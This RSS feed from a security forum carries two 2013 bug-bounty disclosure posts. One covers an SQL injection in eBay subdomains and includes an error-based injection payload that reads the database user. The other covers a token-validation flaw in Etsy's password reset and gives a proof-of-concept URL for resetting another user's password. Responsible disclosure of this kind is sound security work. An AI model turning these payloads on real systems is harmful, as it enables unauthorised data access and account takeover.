<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs - Inxroot</title>
		<link>http://garage4hackers.com/blog.php?u=78</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 12:33:46 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs - Inxroot</title>
			<link>http://garage4hackers.com/blog.php?u=78</link>
		</image>
		<item>
			<title>SQL Injection Vulnerability in ebay</title>
			<link>http://garage4hackers.com/entry.php?b=677</link>
			<pubDate>Fri, 25 Jan 2013 19:36:33 GMT</pubDate>
			<description>Title: SQL Injection Vulnerability in eBay.com sub domains 
Author: Yogesh D Jaygadkar 
Reported: December 27, 2012 
Fixed: Jan 15, 2013 
Public...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Title: SQL Injection Vulnerability in eBay.com sub domains<br />
Author: Yogesh D Jaygadkar<br />
Reported: December 27, 2012<br />
Fixed: Jan 15, 2013<br />
Public Released: Jan 25, 2013<br />
Thanks To: Darshit Ashara<br />
Greets : Rahul Bro, Aasim, Sandeep, Sagar<br />
<br />
<u>Description</u>:<br />
<br />
Last Month I <a href="http://www.jaygadkar.com/2013/01/sql-injection-vulnerability-in-ebay.html" target="_blank">reported </a>SQL Injection vulnerabilities in eBay.com sub domains. You can see how many days they took for patching &amp; allowing me to publish the vulnerability. But finally they fixed it &amp; listed me in their <a href="http://pages.ebay.com/securitycenter/ResearchersAcknowledgement.html" target="_blank">Researchers Acknowledgement Page</a>.Like every other bounty hunter I was also searching for some vulnerability in EBAY.That time I have no idea that Ebay don’t give bounty for any vulnerability. Not even for SQL Injection. :)<br />
<br />
<br />
<u>POC</u>:<br />
<br />
Sub Domains:  sea.ebay.com &amp; export.ebay.co.th<br />
<br />
Page: <br />
sea.ebay.com/searchAnnoucement.php<br />
export.ebay.co.th/searchAnnoucement.php<br />
<br />
Vulnerable Parameter: “checkbox” Array POST parameter.<br />
<br />
Search option in above pages provides a “Select Site” checkboxes which filters the search result by different countries.<br />
<br />
<br />
<br />
<img src="https://dl.dropbox.com/u/33853470/ebay-sqli1.png" border="0" alt="" /><br />
<br />
<img src="https://dl.dropbox.com/u/33853470/ebay-th.png" border="0" alt="" /><br />
<br />
<br />
<br />
<u>HTTP Headers:</u><br />
<br />
Host: sea.ebay.com <br />
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101 Firefox/17.0 <br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 <br />
Accept-Language: en-US,en;q=0.5 <br />
Accept-Encoding: gzip, deflate <br />
Connection: keep-alive <br />
Referer: <a href="http://sea.ebay.com/searchAnnoucement.php-time=Jan%202012" target="_blank">http://sea.ebay.com/searchAnnoucemen...ime=Jan%202012</a> <br />
Cookie: Cookie Value<br />
 Content-Type: application/x-www-form-urlencoded <br />
Content-Length: 16 <br />
<br />
<u>POST Contents:</u> checkbox%5B%5D=(select+1+and+row(1%2c1)&gt;(select+co  unt(*)%2cconcat(CONCAT(CHAR(68)%2C(SELECT+USER())%  2CCHAR(65)%2CCHAR(86)%2CCHAR(73)%2CCHAR(68))%2c0x3  a%2cfloor(rand()*2))x+from+(select+1+union+select+  2)a+group+by+x+limit+1))&amp;<br />
<br />
<br />
So this is all for submitting report. After that I simply used sqlmap the gr8 :)<br />
<br />
<img src="https://dl.dropbox.com/u/33853470/ebay-sqli.png" border="0" alt="" /></blockquote>

]]></content:encoded>
			<dc:creator>Inxroot</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=677</guid>
		</item>
		<item>
			<title>Password Reset Vulnerability in etsy.com</title>
			<link>http://garage4hackers.com/entry.php?b=574</link>
			<pubDate>Tue, 08 Jan 2013 13:06:19 GMT</pubDate>
			<description><![CDATA[Hi Friends & All Big Bros 
 
Yesterday i received my first white hat bounty from etsy.com for...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hi Friends &amp; All Big Bros<br />
<br />
Yesterday i received my first white hat bounty from etsy.com for <a href="http://www.jaygadkar.com/2013/01/password-reset-vulnerability-in-etsycom.html" target="_blank">finding </a>password related vulnerability.<br />
<br />
 In etsy.com, when users reset their password, they receives password reset link which is as below.<br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<a href="http://h##ps://www.etsy.com/confirm.php?email=" target="_blank">h##ps://www.etsy.com/confirm.php?email=</a>[User Email ID]&amp;code=[Token code]&amp;action=reset_password&amp;utm_source=account&amp;utm_medi  um=trans_email&amp;utm_campaign=forgot_password_1
			
		</div>
	</div>
</div><br />
I noticed that token is not getting validated from server side. So I removed it &amp; tested with my own id. <br />
<br />
 Final POC:<br />
<div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<a href="http://h##ps://www.etsy.com/confirm.php?email=" target="_blank">h##ps://www.etsy.com/confirm.php?email=</a>[victim user's email ID]&amp;action=reset_password&amp;utm_source=account&amp;utm_medi  um=trans_email&amp;utm_campaign=forgot_password_1
			
		</div>
	</div>
</div>And Password changed successfully. <br />
<br />
<img src="https://dl.dropbox.com/u/33853470/etsy1.png" border="0" alt="" /><br />
<br />
<br />
<img src="https://dl.dropbox.com/u/33853470/etsy3.png" border="0" alt="" /><br />
<br />
 Finally I am listed in <a href="http://www.etsy.com/help/article/2463" target="_blank">ETSY </a>Thanks Page. &amp; rewarded with $1500 bounty &amp; T-shirt<br />
Thanks to etsy security team for quick reply. <br />
<br />
Thanks to my friends : Darshit, sandeep, rahul bro, aasim , sagar &amp; G4H :)</blockquote>

]]></content:encoded>
			<dc:creator>Inxroot</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=574</guid>
		</item>
	</channel>
</rss>
